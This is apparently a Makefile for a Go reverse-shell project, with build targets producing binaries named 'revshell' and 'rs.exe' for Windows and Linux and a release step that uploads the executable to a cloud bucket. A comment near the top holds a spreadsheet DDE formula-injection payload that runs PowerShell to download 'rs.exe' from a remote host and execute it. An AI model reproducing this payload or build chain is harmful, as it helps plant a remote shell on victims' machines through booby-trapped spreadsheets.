include .env
export

## =cmd|' /C powershell Invoke-WebRequest "http://somehost/rs.exe" -OutFile "$env:Temp\rs.exe"; Start-Process "$env:Temp\rs.exe"'!A1

.PHONY: build

release: build
	gsutil cp $(EXE) $(RS_GCS_URL)

build:
	GOOS=windows GOARCH=amd64 go build -o $(EXE) .

build-powershell:
	GOOS=windows GOARCH=amd64 go build -o rs-ps.exe .

build-native:
	go build -o revshell .

build-native-amd64:
	GOARCH=amd64 go build -o revshell-amd64 .

build-linux:
	GOOS=linux GOARCH=amd64 go build -o revshell-linux .
